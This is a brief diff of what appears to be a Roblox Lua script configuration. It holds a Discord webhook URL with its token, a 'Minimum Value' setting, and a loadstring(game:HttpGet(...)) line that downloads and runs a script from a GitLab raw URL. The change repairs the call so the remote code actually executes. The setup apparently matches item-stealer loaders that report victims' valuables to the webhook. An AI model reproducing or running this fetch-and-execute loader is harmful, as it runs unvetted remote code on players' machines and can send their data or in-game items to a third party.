@@ -3,4 +3,4 @@ Webhook = "https://discord.com/api/webhooks/1388709857883852903/b1zSIKxX3Cq8tPQ1
 Minimum Value = 1
 
 loadstring(game:HttpGet("https://gitlab.com/
-traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))O
+traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
